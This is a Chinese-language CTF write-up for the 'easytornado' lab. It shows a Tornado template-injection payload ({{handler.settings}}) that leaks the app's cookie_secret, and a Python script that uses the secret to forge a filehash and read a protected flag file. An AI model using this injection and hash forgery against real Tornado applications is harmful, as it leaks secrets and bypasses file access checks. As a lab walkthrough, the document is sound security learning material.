# easytornado

我们可以查看三个地址:

`/flag.txt` 内容:

```
flag in /fllllllllllllag
```

`/welcome.txt` 只有 `render`, 我也不懂什么意思.

`/hints.txt` 让我们知道 `filehash` 的构造:

```
md5(cookie_secret+md5(filename))
```

以上三个 `URL` 有共同的结构:

```
http://111.200.241.244:53584/file?filename=文件路径&filehash=文件哈希
```

那么需要构造 `URL`: `/file?filename=/fllllllllllllag&filehash=文件 /fllllllllllllag 的哈希` 就可以得到 `flag`. 根据 `/hint.txt` 的提示, 需要找到 `cookie_secret`.

使用 `gobuster`, 我找到地址 `http://111.200.241.244:53584/error?msg=` 可能存在 `SSTI` 漏洞 (题名 `tornado` 是一个 `Python` 框架名).

不知道怎样才能拿到 `cookie`, 查了一些 [write up](https://blog.csdn.net/mochu7777777/article/details/104866991), `cookie` 可以读通过 `handler.settings`:

```
http://111.200.241.244:53584/error?msg={{handler.settings}}
```

返回:

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '22894d2e-48f5-4dc1-8818-1d41327a50e2'}
```

最后写一个简单的脚本:

```py
import hashlib

filename = '/fllllllllllllag'
cookie_secret = '22894d2e-48f5-4dc1-8818-1d41327a50e2'

filename_md5 = hashlib.md5(filename.encode()).hexdigest()
filehash = hashlib.md5((cookie_secret + filename_md5).encode()).hexdigest()

print(filehash)
```

Payload:

```
http://111.200.241.244:53584/file?filename=/fllllllllllllag&filehash=7a64956f47e504739e99573d5db0d148
```
